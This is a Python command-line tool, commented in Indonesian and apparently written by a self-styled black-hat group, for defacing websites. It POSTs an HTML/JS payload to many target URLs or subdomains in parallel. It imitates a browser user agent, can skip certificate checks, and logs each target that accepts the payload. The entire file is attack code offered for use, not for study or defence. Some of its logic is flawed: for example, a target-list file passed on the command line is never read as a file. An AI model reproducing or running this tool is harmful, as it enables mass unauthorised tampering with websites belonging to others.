#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Spray Tool for Defacement
-------------------------
Script untuk menyemprotkan payload HTML/JS/CSS ke banyak subdomain atau URL.
Mendukung multi-threading, logging, dan error handling yang robust.

Author: APT ELITE_BLACKHAT
Version: 1.0
"""

import os
import sys
import time
import socket
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import logging
import argparse
from pathlib import Path

# Konfigurasi Logging
LOG_FILE = "spray_log.txt"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# User Agent Default untuk meniru browser modern
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

class DefaceSprayer:
    def __init__(self, payload_content, headers=None, verify_ssl=False, timeout=10, max_threads=10):
        """
        Inisialisasi alat spray.
        
        :param payload_content: String konten HTML/Payload yang akan disemprotkan.
        :param headers: Dictionary header HTTP tambahan (opsional).
        :param verify_ssl: Boolean, verifikasi sertifikat SSL (default False untuk bypass self-signed).
        :param timeout: Timeout koneksi dalam detik.
        :param max_threads: Jumlah thread maksimal untuk paralel.
        """
        self.payload = payload_content
        self.headers = headers or {
            'User-Agent': DEFAULT_USER_AGENT,
            'Content-Type': 'text/html'
        }
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.max_threads = max_threads
        self.session = requests.Session()
        # Nonaktifkan warning SSL jika tidak memverifikasi
        if not verify_ssl:
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    def _get_target_url(self, raw_url):
        """Memastikan URL memiliki protokol."""
        parsed = urlparse(raw_url.strip())
        if not parsed.scheme:
            return f"http://{raw_url.strip()}"
        return raw_url.strip()

    def _check_connectivity(self, url):
        """Cek apakah host bisa di-resolve sebelum mencoba POST."""
        try:
            hostname = urlparse(url).hostname
            socket.getaddrinfo(hostname, None)
            return True
        except socket.gaierror:
            return False

    def spray_single(self, url):
        """
        Fungsi utama untuk menyemprotkan payload ke satu URL.
        
        :param url: Target URL.
        :return: Tuple (status_code, message)
        """
        target_url = self._get_target_url(url)
        
        # Cek konektivitas dasar
        if not self._check_connectivity(target_url):
            return (0, f"[DNS FAIL] {target_url}")

        try:
            # Lakukan request POST atau GET tergantung kebutuhan payload
            # Biasanya defacement menggunakan POST untuk upload atau PUT/PATCH untuk override
            # Di sini kita gunakan POST sebagai default, tapi bisa disesuaikan
            
            response = self.session.post(
                target_url,
                data=self.payload,
                headers=self.headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            if response.status_code in [200, 201, 204, 301, 302]:
                msg = f"[SUCCESS] {target_url} -> Status: {response.status_code}"
                logger.info(msg)
                return (response.status_code, msg)
            else:
                msg = f"[FAIL] {target_url} -> Status: {response.status_code}"
                logger.warning(msg)
                return (response.status_code, msg)

        except requests.exceptions.Timeout:
            msg = f"[TIMEOUT] {target_url}"
            logger.error(msg)
            return (0, msg)
        except requests.exceptions.ConnectionError:
            msg = f"[CONN ERROR] {target_url}"
            logger.error(msg)
            return (0, msg)
        except Exception as e:
            msg = f"[ERROR] {target_url} -> {str(e)}"
            logger.error(msg)
            return (0, msg)

    def run_spray(self, targets):
        """
        Menjalankan spray ke semua target menggunakan thread pool.
        
        :param targets: List of URLs atau path ke file berisi URLs.
        """
        if isinstance(targets, str) and os.path.isfile(targets):
            with open(targets, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
        elif isinstance(targets, list):
            urls = targets
        else:
            # Asumsi string tunggal dengan newline
            urls = [t.strip() for t in targets.split('\n') if t.strip()]

        if not urls:
            logger.warning("Tidak ada target yang valid ditemukan.")
            return

        logger.info(f"Dimulai spraying ke {len(urls)} target dengan {self.max_threads} threads.")
        
        successful = []
        failed = []

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_url = {executor.submit(self.spray_single, url): url for url in urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    status_code, message = future.result()
                    if status_code > 0:
                        successful.append(message)
                    else:
                        failed.append(message)
                except Exception as exc:
                    logger.error(f"Target {url} generated an exception: {exc}")
                    failed.append(f"[UNKNOWN] {url}")

        end_time = time.time()
        duration = end_time - start_time
        
        logger.info("-" * 50)
        logger.info(f"SELESAI! Total Waktu: {duration:.2f} detik")
        logger.info(f"Sukses: {len(successful)} | Gagal: {len(failed)}")
        logger.info("-" * 50)
        
        # Simpan hasil ke file terpisah jika diinginkan
        with open("spray_results.txt", "w", encoding="utf-8") as f:
            f.write(f"Total Time: {duration:.2f}s\n")
            f.write(f"Successful: {len(successful)}\n")
            f.write(f"Failed: {len(failed)}\n")
            f.write("-" * 50 + "\n")
            for res in successful:
                f.write(res + "\n")
            f.write("-" * 50 + "\n")
            for res in failed:
                f.write(res + "\n")

def load_payload_from_file(file_path):
    """Memuat payload dari file .html, .js, atau .txt."""
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    else:
        raise FileNotFoundError(f"File payload '{file_path}' tidak ditemukan.")

def main():
    parser = argparse.ArgumentParser(description="ELITE BLACKHAT Defacement Spray Tool")
    parser.add_argument("-p", "--payload", required=True, help="Path ke file payload (HTML/JS) atau string payload langsung.")
    parser.add_argument("-t", "--targets", nargs='+', required=True, help="URL target atau path ke file daftar URL (baris per baris).")
    parser.add_argument("--threads", type=int, default=10, help="Jumlah thread paralel (default: 10).")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout koneksi per request (default: 10s).")
    parser.add_argument("--no-ssl", action="store_true", help="Jangan verifikasi sertifikat SSL.")
    parser.add_argument("--header", action="append", help="Header kustom tambahan (format: 'Key: Value'). Bisa digunakan berkali-kali.")
    
    args = parser.parse_args()

    # Load Payload
    payload_content = ""
    if os.path.exists(args.payload):
        try:
            payload_content = load_payload_from_file(args.payload)
        except Exception as e:
            logger.error(f"Gagal memuat payload: {e}")
            sys.exit(1)
    else:
        # Asumsi args.payload adalah string langsung
        payload_content = args.payload

    if not payload_content:
        logger.error("Payload kosong!")
        sys.exit(1)

    # Setup Headers Tambahan
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                key, val = h.split(':', 1)
                custom_headers[key.strip()] = val.strip()

    # Inisialisasi Sprayer
    sprayer = DefaceSprayer(
        payload_content=payload_content,
        headers=custom_headers,
        verify_ssl=not args.no_ssl,
        timeout=args.timeout,
        max_threads=args.threads
    )

    # Jalankan
    sprayer.run_spray(args.targets)

if __name__ == "__main__":
    main()
